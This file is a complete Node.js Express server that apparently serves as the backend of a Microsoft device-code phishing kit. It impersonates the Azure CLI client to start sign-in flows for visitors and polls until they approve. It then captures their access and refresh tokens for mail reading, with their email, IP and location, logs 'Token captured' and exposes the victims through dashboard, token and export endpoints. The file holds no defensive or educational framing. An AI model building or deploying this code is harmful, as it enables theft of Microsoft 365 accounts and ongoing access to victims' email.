const express = require('express');
const axios = require('axios');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// UPDATED: Using a working public client ID (Azure CLI's client ID)
const MICROSOFT_CONFIG = {
    clientId: '04b07795-8ddb-461a-bbee-02f9e1bf7b46', // Azure CLI public client
    deviceCodeUrl: 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
    tokenUrl: 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
    scopes: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read offline_access'
};

let userSessions = new Map();
let pendingDeviceCodes = new Map();

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
}

function getCountryFromIp(ip) {
    const countryMap = {
        '172.': 'United States',
        '104.': 'United States',
        '185.': 'Germany',
        '188.': 'United Kingdom',
        '45.': 'Canada',
        '103.': 'India'
    };
    for (const [prefix, country] of Object.entries(countryMap)) {
        if (ip && ip.startsWith(prefix)) return country;
    }
    return 'Other';
}

app.post('/api/device/auth/start', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'];
        
        const response = await axios.post(MICROSOFT_CONFIG.deviceCodeUrl,
            new URLSearchParams({
                client_id: MICROSOFT_CONFIG.clientId,
                scope: MICROSOFT_CONFIG.scopes
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, verification_uri, expires_in } = response.data;
        const sessionId = crypto.randomBytes(16).toString('hex');
        
        pendingDeviceCodes.set(device_code, {
            device_code,
            user_code,
            sessionId,
            status: 'pending',
            ip: clientIp,
            userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        startPollingForToken(device_code, sessionId);
        
        res.json({
            sessionId,
            user_code,
            verification_uri,
            expires_in
        });
        
    } catch (err) {
        console.error('Device code error:', err.response?.data || err.message);
        res.status(500).json({ error: 'Failed to start device authentication' });
    }
});

async function startPollingForToken(device_code, sessionId) {
    const pollInterval = setInterval(async () => {
        const pendingDevice = pendingDeviceCodes.get(device_code);
        if (!pendingDevice || pendingDevice.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pendingDevice.expiresAt) {
            pendingDevice.status = 'expired';
            pendingDeviceCodes.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post(MICROSOFT_CONFIG.tokenUrl,
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: MICROSOFT_CONFIG.clientId,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            pendingDevice.status = 'approved';
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const session = {
                sessionId,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                displayName: userInfo.data.displayName,
                userId: userInfo.data.id,
                ip: pendingDevice.ip || 'Unknown',
                userAgent: pendingDevice.userAgent || 'Unknown',
                country: getCountryFromIp(pendingDevice.ip || ''),
                tokens: {
                    access_token: tokens.access_token,
                    refresh_token: tokens.refresh_token,
                    expires_in: tokens.expires_in,
                    expires_at: Date.now() + (tokens.expires_in * 1000)
                },
                tokenValid: true,
                createdAt: new Date().toISOString(),
                lastActive: new Date().toISOString()
            };
            
            userSessions.set(sessionId, session);
            console.log(`✅ Token captured for ${session.email}`);
            clearInterval(pollInterval);
            pendingDeviceCodes.delete(device_code);
            
        } catch (err) {
            // This is normal - just waiting for user approval
            if (err.response?.data?.error !== 'authorization_pending') {
                console.log('Polling status:', err.response?.data?.error || 'Waiting...');
            }
        }
    }, 3000);
}

app.get('/api/device/status/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    
    const existingSession = userSessions.get(sessionId);
    if (existingSession) {
        return res.json({ status: 'approved', email: existingSession.email });
    }
    
    for (const [device_code, pending] of pendingDeviceCodes.entries()) {
        if (pending.sessionId === sessionId) {
            return res.json({ status: pending.status });
        }
    }
    
    res.json({ status: 'not_found' });
});

app.get('/api/sessions', async (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        sessionId: s.sessionId,
        email: s.email,
        displayName: s.displayName,
        ip: s.ip,
        userAgent: s.userAgent,
        country: s.country,
        lastActive: s.lastActive,
        createdAt: s.createdAt
    }));
    res.json({ sessions });
});

app.get('/api/session/token/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const session = userSessions.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({
        email: session.email,
        expiresAt: session.tokens.expires_at,
        token: {
            access_token: session.tokens.access_token.substring(0, 100) + '...',
            expires_in: session.tokens.expires_in
        }
    });
});

app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

app.get('/api/sessions/export', async (req, res) => {
    const exportData = Array.from(userSessions.values()).map(s => ({
        email: s.email,
        displayName: s.displayName,
        createdAt: s.createdAt,
        country: s.country
    }));
    res.json(exportData);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Dashboard running on port ${PORT}`);
});
